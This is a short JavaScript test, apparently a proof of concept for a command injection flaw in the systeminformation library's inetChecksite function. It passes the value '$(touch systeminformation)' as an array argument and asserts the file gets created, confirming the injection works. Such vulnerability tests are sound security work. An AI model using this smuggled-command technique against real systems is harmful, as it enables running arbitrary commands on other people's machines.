//https://github.com/sebhildebrandt/systeminformation/pull/492
test("Command Injection in systeminformation", () => 
{
    const si = require('systeminformation');
	const fs = require('fs')
	const path = './systeminformation'
	const sleep = require('sleep');
    
    const command = "$(touch systeminformation)";

    si.inetChecksite([command]);
	
	
	sleep.sleep(7);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});